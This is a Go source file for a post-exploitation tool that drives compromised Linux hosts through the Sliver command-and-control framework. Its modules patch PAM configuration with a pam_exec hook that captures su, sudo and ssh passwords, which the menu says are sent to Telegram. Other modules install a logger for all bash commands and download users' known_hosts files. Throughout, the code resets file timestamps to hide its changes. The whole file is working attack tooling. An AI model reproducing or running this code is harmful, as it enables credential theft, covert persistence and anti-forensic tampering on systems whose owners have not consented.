package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"gopkg.in/ini.v1"

	"github.com/bishopfox/sliver/client/assets"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/manifoldco/promptui" // 引入promptui库
)

func makeRequest(session *clientpb.Session) *commonpb.Request {
	if session == nil {
		return nil
	}
	timeout := int64(60)
	return &commonpb.Request{
		SessionID: session.ID,
		Timeout:   timeout,
	}
}

func listSessions(rpc rpcpb.SliverRPCClient) (*clientpb.Sessions, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	sessions, err := rpc.GetSessions(ctx, &commonpb.Empty{})
	if err != nil {
		return sessions, fmt.Errorf("無法獲取 sessions 列表: %v", err)
	}
	return sessions, nil
}

func netstat_session(rpc rpcpb.SliverRPCClient, session *clientpb.Session) error {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	resp, err := rpc.Netstat(ctx, &sliverpb.NetstatReq{
		TCP:       true,
		UDP:       true,
		IP4:       true,
		IP6:       true,
		Listening: true,
		Request:   makeRequest(session),
	})
	if err != nil {
		log.Fatalf("Netstat 请求失败: %v", err)
	}
	fmt.Print(resp)
	return nil
}

func ls_session_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, path string) (*sliverpb.Ls, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	files, err := rpc.Ls(ctx, &sliverpb.LsReq{
		Path:    path,
		Request: makeRequest(session),
	})
	if err != nil {
		log.Fatalf("ls 请求失败: %v", err)
	}
	return files, nil
}

func create_directory(rpc rpcpb.SliverRPCClient, session *clientpb.Session, path string) (*sliverpb.Mkdir, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	resp, err := rpc.Mkdir(ctx, &sliverpb.MkdirReq{
		Path:    path,
		Request: makeRequest(session),
	})
	if err != nil {
		log.Fatalf("mkdir failed: %v", err)
	}
	return resp, nil
}

func upload_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, source_path string, destination_path string) (*sliverpb.Upload, error) {
	startTime := time.Now()
	log.Printf("starting uploading file : %v\n", startTime)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second*180)
	defer cancel()

	log.Printf("starting reading: %s \n", source_path)

	fileData, err := os.ReadFile(source_path)
	if err != nil {
		log.Fatalf("failed read : %v", err)
	}

	log.Printf("uploading file to : %s\n", destination_path)

	files, err := rpc.Upload(ctx, &sliverpb.UploadReq{
		Path:    destination_path,
		Data:    fileData,
		Request: makeRequest(session),
	})
	if err != nil {
		log.Printf("failed to upload: %v", err)
	}

	log.Printf("upload finished: %v\n", time.Now())

	endTime := time.Now()
	log.Printf("upload cost : %v s\n", endTime.Sub(startTime).Seconds())

	return files, nil
}

func download_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, download_path string) (*sliverpb.Download, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*60)
	defer cancel()

	files, err := rpc.Download(ctx, &sliverpb.DownloadReq{
		Path:    download_path,
		Request: makeRequest(session),
	})
    if err != nil {
        // 将错误返回给调用者，而不是中断程序
        return nil, fmt.Errorf("download failed: %v", err)
    }
	return files, nil
}

func modify_pam_file(compressedData []byte, configLine string, add_after_line string) ([]byte, error) {
	decodedString, err := decompressGzipData(compressedData)
	if err != nil {
		return nil, fmt.Errorf("error decompressing data: %v", err)
	}

	if strings.Contains(decodedString, configLine) {
		return compressedData, nil
	}

	new_pam_file := strings.Replace(decodedString, add_after_line, add_after_line+"\n"+configLine, 1)

	err = os.WriteFile("modified_file.conf", []byte(new_pam_file), 0644)
	if err != nil {
		return nil, fmt.Errorf("error saving modified pam file: %v", err)
	}

	newCompressedData, err := compressGzipData(new_pam_file)
	if err != nil {
		return nil, fmt.Errorf("error compressing data: %v", err)
	}

	return newCompressedData, nil
}

func chmod_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, path string) (*sliverpb.Chmod, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	chmod_files, err := rpc.Chmod(ctx, &sliverpb.ChmodReq{
		Path:     path,
		FileMode: "0755",
		Request:  makeRequest(session),
	})
	if err != nil {
		log.Fatalf("chmod file  failed: %v", err)
	}
	return chmod_files, nil
}

func chtimes_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, path string, Modify_time int64) (*sliverpb.Chtimes, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	chtimes_files, err := rpc.Chtimes(ctx, &sliverpb.ChtimesReq{
		Path:    path,
		ATime:   Modify_time,
		MTime:   Modify_time,
		Request: makeRequest(session),
	})
	if err != nil {
		log.Printf("chtimes failed: %v", err)
	}
	return chtimes_files, nil
}

func decompressGzipData(compressedData []byte) (string, error) {
	reader, err := gzip.NewReader(bytes.NewReader(compressedData))
	if err != nil {
		return "", fmt.Errorf("failed to create gzip reader: %v", err)
	}
	defer reader.Close()

	var uncompressedData bytes.Buffer
	_, err = uncompressedData.ReadFrom(reader)
	if err != nil {
		return "", fmt.Errorf("failed to read uncompressed data: %v", err)
	}

	return uncompressedData.String(), nil
}

func compressGzipData(uncompressedData string) ([]byte, error) {
	var compressedData bytes.Buffer
	writer := gzip.NewWriter(&compressedData)

	_, err := writer.Write([]byte(uncompressedData))
	if err != nil {
		return nil, fmt.Errorf("failed to compress data: %v", err)
	}
	writer.Close()

	return compressedData.Bytes(), nil
}

func runSearchKnownHosts(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
	var KnownHost_list []string
	KnownHost_list = append(KnownHost_list,"/root" )

	files, err := ls_session_file(rpc, session, "/home/")
	if err != nil {
		log.Fatalf("get folder failed: %v", err)
	}
	for _, file := range files.Files {
		if file.IsDir  {
			//log.Printf("%s is directory",file.Name)
			KnownHost_list = append(KnownHost_list,"/home/" + file.Name )
		} 
	}
	for _, known_host := range KnownHost_list {
		known_host = known_host  + "/.ssh/known_hosts"
		log.Printf("Starting Downloading files. %s",known_host)
		known_host_file, err := download_file(rpc,session,known_host)
		if err != nil {
			log.Println(err)
			continue
		} else {
			log.Printf("download success %s\n", known_host_file.Path)
			decodedString, err := decompressGzipData(known_host_file.Data)
			if err != nil {
				log.Fatalf("error decompressing data: %v", err)
			}
			log.Printf("content of %s \n",known_host_file.Path)
			log.Println(decodedString)

		}
	}
}

func runLogAllCommand(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
	fmt.Printf("upload /usr/local/bin/history_log from  %s  ",commandLoggerPath )

	files, err := ls_session_file(rpc, session, "/usr/local/")
	if err != nil {
		log.Fatalf("getting command loger modify time failed: %v", err)
	}
	Modify_time := files.Files[0].ModTime
	fmt.Println(Modify_time)


	uploadFiles, err := upload_file(rpc, session, commandLoggerPath, "/usr/local/bin/history_log")
	if err != nil {
		log.Fatalf("upload failed: %v", err)
	} else {
		log.Println("upload success", uploadFiles)
	}
	chtimes_files, err := chtimes_file(rpc, session, "/usr/local/bin/history_log", Modify_time)
	if err != nil {
		log.Fatalf("chtimes_files%s failed: %v", chtimes_files, err)
	}
	//upload history.sh
	log.Printf("upload /etc/profile.d/history.sh  %s  ",commandLoggerPath )
	files, err = ls_session_file(rpc, session, "/etc/profile.d/")
	if err != nil {
		log.Fatalf("getting /etc/profile.d  modify time failed: %v", err)
	}
	Modify_time = files.Files[0].ModTime
	log.Println(Modify_time)

	uploadFiles, err = upload_file(rpc, session, commandHistoryPath, "/etc/profile.d/history.sh")
	if err != nil {
		log.Fatalf("upload failed: %v", err)
	} else {
		log.Println("upload success", uploadFiles)
	}
	chtimes_files, err = chtimes_file(rpc, session, "/etc/profile.d/history.sh", Modify_time)
	if err != nil {
		log.Fatalf("chtimes_files%s failed: %v", chtimes_files, err)
	}
	chmodFiles, err := chmod_file(rpc, session, "/usr/local/bin/history_log")
	if err != nil {
		log.Fatalf("modify /usr/local/bin/history_log permission failed: %v", err)
	} else {
		log.Printf("modify /usr/local/bin/history_log permission %s\n", chmodFiles)
	}
}

func searchCredentialsFromFiles(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
	fmt.Print("Still working on it ")
}
func searchCredentialsFromMemory(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
	fmt.Print("Still working on it ")
}
func runPamLoggerModule(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
	log.Println("\n\nStart adding pam logger in Hostname:", session.Hostname, "Version:", session.Version, "RemoteAddress:", session.RemoteAddress)

	var pamPaths []string
	var configLine string
	var addAfterLine string
	var sshdConfigLine string
	var sshdReplaceLine string
	switch {
	case strings.Contains(session.Version, "el7"):
		fmt.Println("This system is likely CentOS 7 or RHEL 7.")
		pamPaths = []string{"/etc/pam.d/system-auth", "/etc/pam.d/sshd"}
		configLine = "auth        optional      pam_exec.so quiet expose_authtok /lib/security/logger\n"
		addAfterLine = "auth        required      pam_env.so"

		sshdConfigLine = "auth       optional     pam_exec.so quiet expose_authtok /lib/security/logger"
		sshdReplaceLine = "auth	   required	pam_sepermit.so"
	case strings.Contains(session.Version, "ubuntu"):
		fmt.Println("This system is likely ubuntu")
		pamPaths = []string{"/etc/pam.d/common-auth"}
		configLine = "auth optional pam_exec.so quiet expose_authtok /lib/security/pam_logger\n"
		addAfterLine = "auth	requisite			pam_deny.so"
	default:
		fmt.Println("Unable to determine the specific Linux distribution")
		pamPaths = []string{"/etc/pam.d/common-auth"}
		configLine = "auth optional pam_exec.so quiet expose_authtok /lib/security/pam_logger\n"
		addAfterLine = "auth	requisite			pam_deny.so"
	}
	var Modify_time int64
	for _, pamPath := range pamPaths {
		fmt.Printf("starting replace %s \n", pamPath)

		files, err := ls_session_file(rpc, session, pamPath)
		if err != nil {
			log.Fatalf("checking%s failed: %v", pamPath, err)
		}
		Modify_time := files.Files[0].ModTime

		downloadFiles, err := download_file(rpc, session, pamPath)
		if err != nil {
			log.Fatalf("download %s failed: %v", pamPath, err)
		} else {
			fmt.Printf("download success %s\n", downloadFiles.Path)
		}

		var newFile []byte

		if pamPath == "/etc/pam.d/sshd" && sshdConfigLine != "" {
			newFile, err = modify_pam_file(downloadFiles.Data, sshdConfigLine, sshdReplaceLine)
		} else {
			newFile, err = modify_pam_file(downloadFiles.Data, configLine, addAfterLine)
		}
		if err != nil {
			log.Fatalf("本地modify pam config failed: %v", err)
		} else {
			if bytes.Equal(newFile, downloadFiles.Data) {
				fmt.Printf("%s配置已有植入logger，不修改文件\n", downloadFiles.Path)
			} else {
				fmt.Printf("開始更新 %s 配置", pamPath)
				uploadFiles, err := upload_file(rpc, session, "modified_file.conf", pamPath)
				if err != nil {
					log.Fatalf("upload failed: %v", err)
				} else {
					log.Println("upload成功", uploadFiles)
				}
				chtimes_files, err := chtimes_file(rpc, session, pamPath, Modify_time)
				if err != nil {
					log.Fatalf("chtimes_files%s failed: %v", chtimes_files, err)
				}
			}
		}
	}

	files, err := ls_session_file(rpc, session, "/lib/security")
	if err != nil {
		log.Fatalf("get files failed: %v", err)
	}
	foundLogger := false
	for _, file := range files.Files {
		if (file.GetName() == "logger" || file.GetName() == "pam_logger") &&
			file.GetSize() == 7100304 &&
			file.GetMode() == "-rwxr-xr-x" {
			fmt.Println("Found logger file with the required size and executable permissions for all users.")
			foundLogger = true
			break
		}
	}
	if !foundLogger {
		fmt.Println("starting upload  /lib/security/logger")
		resp, err := create_directory(rpc, session, "/lib/security/")
		if err != nil {
			log.Fatalf("Create %s failed: %v", resp, err)
		} else {
			fmt.Printf("Create %s 成功\n", resp)
		}

		chmodFiles, err := chmod_file(rpc, session, "/lib/security")
		if err != nil {
			log.Fatalf("modify /lib/security/ permission failed: %v", err)
		} else {
			fmt.Printf("modify /lib/security/ permission success %s", chmodFiles)
		}
		uploadFiles, err := upload_file(rpc, session, pamLoggerPath, "/lib/security/logger")
		if err != nil {
			log.Fatalf("upload failed: %v", err)
		} else {
			fmt.Println("upload success", uploadFiles)
		}
		chmodFiles, err = chmod_file(rpc, session, "/lib/security/logger")
		if err != nil {
			log.Fatalf("modify /lib/security/logger permission failed: %v", err)
		} else {
			fmt.Printf("modify /lib/security/logger permission %s\n", chmodFiles)
		}
		chtimesFiles, err := chtimes_file(rpc, session, "/lib/security/logger", Modify_time)
		if err != nil {
			log.Fatalf("modify /lib/security/logger chtimes failed: %v", err)
		} else {
			fmt.Printf("modify /lib/security/logger chtimes  %s", chtimesFiles)
		}
	}
}

var sliverConfigPath string
var pamLoggerPath string
var commandLoggerPath string
var commandHistoryPath string
func main() {
	// var configPath string
	// flag.StringVar(&configPath, "config", "/Users/timmy/Downloads/timmy_mac_35.236.161.97.cfg", "path to sliver client config file")
	// flag.Parse()

	cfg, err := ini.Load("config.ini")
	if err != nil {
	  log.Fatal("Fail to read file: ", err)
	}

	// 从配置文件中获取参数
	sliverConfigPath = cfg.Section("Sliver-Server").Key("sliver-cfg").String()
	pamLoggerPath = cfg.Section("PAM-Logger").Key("pam-logger").String()
	commandLoggerPath = cfg.Section("CommandLogger").Key("command-logger").String()
	commandHistoryPath = cfg.Section("CommandLogger").Key("command-history").String()


	config, err := assets.ReadConfig(sliverConfigPath)
	if err != nil {
		log.Fatal(err)
	}

	rpc, ln, err := transport.MTLSConnect(config)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("[*] Connected to sliver server")
	log.Println("[*] Welcome to use SliverMoveMoveClient")
	defer ln.Close()

	sessions, err := listSessions(rpc)
	if err != nil {
		log.Fatalf("Get sessions failed: %v", err)
	}

	if len(sessions.Sessions) == 0 {
		log.Println("Oops did not find any active sessions in sliver")
		os.Exit(0)
	}
	log.Printf("[*] Sessions Lists:\n")

	sessionItems := make([]string, len(sessions.Sessions))
	for i, session := range sessions.Sessions {
		sessionItems[i] = fmt.Sprintf("Hostname: %s, Version: %s, RemoteAddress: %s", session.Hostname, session.Version, session.RemoteAddress)
	}

	prompt := promptui.Select{
		Label: "Select Session",
		Items: append([]string{"All Sessions"}, sessionItems...),
	}

	index, result, err := prompt.Run()

	if err != nil {
		log.Fatalf("Session selection failed: %v", err)
	}

	if result == "All Sessions" {
		log.Println("Choese ALL sessions")
	} else if index > 0 {
		selectedSession := sessions.Sessions[index-1] // 使用正确的索引
		sessions.Sessions = sessions.Sessions[:0]     // 清空 sessions.Sessions
		sessions.Sessions = append(sessions.Sessions, selectedSession) // 只保留选中的 session
	} else {
		fmt.Println("Invalid session selected")
		os.Exit(1)
	}

	moduleItems := []string{
		"pam_logger (logger su sudo ssh authentication password and send to telegram)",
		"Search for ssh known hosts",
		"command_logger (looger all bash command in all user)",
		"search credentials from memory",
		"search credentials from files",
	}

	promptModule := promptui.Select{
		Label: "Select Module",
		Items: append([]string{"All Modules"}, moduleItems...),
	}

	_, moduleResult, err := promptModule.Run()

	if err != nil {
		log.Fatalf("Module selection failed: %v", err)
	}

	modules := []int{}
	switch moduleResult {
	case "All Modules":
		modules = []int{1, 2, 3, 4, 5}
	case moduleItems[0]:
		modules = append(modules, 1)
	case moduleItems[1]:
		modules = append(modules, 2)
	case moduleItems[2]:
		modules = append(modules, 3)
	case moduleItems[3]:
		modules = append(modules, 4)
	case moduleItems[4]:
		modules = append(modules, 5)
	}

	for _, session := range sessions.Sessions {
		for _, module := range modules {
			log.Printf("Starting exploit %s with module \"%s\"\n",session.Hostname,moduleItems[module-1])
			switch module {
			case 1:
				runPamLoggerModule(rpc, session)
			case 2:
				runSearchKnownHosts(rpc, session)
			case 3:
				runLogAllCommand(rpc, session)
			case 4:
				searchCredentialsFromMemory(rpc, session)
			case 5:
				searchCredentialsFromFiles(rpc, session)
			default:
				fmt.Println("unvalid module id ")
			log.Printf("Finishing exploit %s with module \"%s\"\n\n",session.Hostname,moduleItems[module-1])

			}
		}
	}
}
